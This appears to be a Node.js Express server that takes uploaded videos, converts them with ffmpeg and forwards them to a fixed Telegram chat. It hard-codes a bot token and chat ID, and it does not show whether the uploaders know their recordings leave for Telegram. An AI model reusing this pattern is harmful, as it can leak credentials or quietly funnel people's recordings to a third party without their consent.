const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");
const path = require("path"); // ✅ ADDED

const app = express();
app.use(cors());

// ✅ Serve frontend (if you add /public/index.html)
app.use(express.static(path.join(__dirname, "public")));

// =====================
// 📁 FILE STORAGE
// =====================
const storage = multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
        const ext = file.originalname.split(".").pop() || "webm";
        cb(null, `${Date.now()}.${ext}`);
    }
});

const upload = multer({ storage });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc"; // ⚠️ CHANGE THIS
const CHAT_ID = "8280326139";

// =====================
// 🏠 ROOT ROUTE (FIXES "Cannot GET /")
// =====================
app.get("/", (req, res) => {
    res.send("Server is running");
});

// =====================
// 🚀 UPLOAD ROUTE
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    let filePath;
    let mp4Path;

    try {
        console.log("\n==============================");
        console.log("🚀 Upload received");

        if (!req.file) {
            console.log("❌ No file uploaded");
            return res.status(400).send("No file uploaded");
        }

        filePath = req.file.path;
        mp4Path = filePath + ".mp4";

        console.log("📁 File path:", filePath);
        console.log("🎥 MIME type:", req.file.mimetype);

        // 🔄 FFmpeg conversion
        console.log("🔄 Starting FFmpeg conversion...");

        await new Promise((resolve, reject) => {
            ffmpeg(filePath)
                .outputOptions([
                    "-c:v libx264",
                    "-preset ultrafast",
                    "-pix_fmt yuv420p",
                    "-c:a aac"
                ])
                .save(mp4Path)
                .on("end", resolve)
                .on("error", reject);
        });

        console.log("📦 Converted file:", mp4Path);

        // 📤 TELEGRAM UPLOAD
        console.log("📤 Sending to Telegram...");

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("video", fs.createReadStream(mp4Path), {
            filename: "specimen.mp4",
            contentType: "video/mp4"
        });

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            form,
            { headers: form.getHeaders() }
        );

        console.log("📨 Telegram response:", response.data);

        // 🧹 CLEANUP
        fs.unlinkSync(filePath);
        fs.unlinkSync(mp4Path);

        res.send("Upload successful");

    } catch (err) {
        console.error("❌ ERROR:", err.message);

        try {
            if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
            if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
        } catch {}

        res.status(500).send("Failed (check server logs)");
    }
});

// =====================
// 🌐 FALLBACK (for frontend routing)
// =====================
app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// =====================
// 🌐 START SERVER
// =====================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
